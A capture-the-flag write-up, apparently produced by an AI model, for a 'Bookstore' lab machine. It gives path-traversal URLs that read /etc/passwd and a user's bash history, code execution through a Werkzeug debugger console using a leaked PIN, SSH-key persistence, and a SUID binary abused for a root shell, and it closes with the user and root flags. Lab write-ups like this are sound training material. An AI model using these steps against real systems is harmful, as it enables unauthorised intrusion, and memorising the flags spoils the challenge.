# Bookstore CTF Writeup
*(solved by gemini 🤖🤖🤖)*
## Enumeration

### Port Scanning
The initial Nmap scan revealed three open ports:
- **Port 22 (SSH)**: OpenSSH 7.6p1
- **Port 80 (HTTP)**: Apache httpd 2.4.29
- **Port 5000 (HTTP)**: Werkzeug httpd 0.14.1 (Python 3.6.9)

### Web Enumeration - Port 80
The website on port 80 is a "Book Store." While exploring the site, a `login.html` page was discovered. In the source code of `login.html`, a comment provided two crucial hints:
1.  There is a user named `sid`.
2.  The Werkzeug debugger PIN is located in `sid`'s bash history file.

### Web Enumeration - Port 5000
The service on port 5000 is "Foxy REST API v2.0."
- `robots.txt` contained a disallowed entry: `/api`.
- Visiting `/api` revealed documentation for several endpoints under `/api/v2/resources/books`.

## Initial Access

### API Vulnerability - LFI
By hypothesizing the existence of a version 1 of the API (`/api/v1/resources/books`), fuzzing was performed on potential parameters. The `show` parameter was found to be vulnerable to Local File Inclusion (LFI).

**Exploit URL:**
`http://10.48.175.114:5000/api/v1/resources/books?show=../../../../etc/passwd`

### Extracting the Debugger PIN
Using the LFI vulnerability, we read `/home/sid/.bash_history`:
`http://10.48.175.114:5000/api/v1/resources/books?show=../../../../home/sid/.bash_history`

**Output from `.bash_history`:**
```bash
export WERKZEUG_DEBUG_PIN=123-321-135
python3 /home/sid/api.py
```
The PIN was found to be `123-321-135`.

### Exploiting Werkzeug Debugger
The Werkzeug debugger was accessible at `http://10.48.175.114:5000/console`.
1.  Unlocked the console using the PIN: `123-321-135`.
2.  Obtained the session cookie: `__wzd6c8b05c4e0100153fcef`.
3.  Executed Python code via the console to read `user.txt`.

**Command to read user flag:**
`open('/home/sid/user.txt').read()`
**User Flag:** `4ea65eb80ed441adb68246ddf7b964ab`

## Privilege Escalation

### SUID Discovery
After establishing SSH access by adding a public key to `/home/sid/.ssh/authorized_keys`, a search for SUID binaries revealed a custom binary: `/home/sid/try-harder`.

### Reverse Engineering `try-harder`
The binary was downloaded and disassembled using `objdump`. The `main` function contained XOR logic to verify a "Magic Number":
- `0x5dcd21f4 ^ 0x1116 ^ 0x5db3`

Calculating this in Python:
```python
python3 -c "print(0x5dcd21f4 ^ 0x1116 ^ 0x5db3)"
# Result: 1573743953
```

### Exploiting `try-harder`
Running the binary with the magic number `1573743953` spawns a root shell (`bash -p`). Due to the non-interactive nature of some environments, the following command was used to capture the root flag:

```bash
printf '1573743953\ncat /root/root.txt\nexit\n' | script -q /dev/null -c ./try-harder
```

**Root Flag:** `e29b05fba5b2a7e69c24a450893158e3`

## Summary of Flags
- **User**: `4ea65eb80ed441adb68246ddf7b964ab`
- **Root**: `e29b05fba5b2a7e69c24a450893158e3`
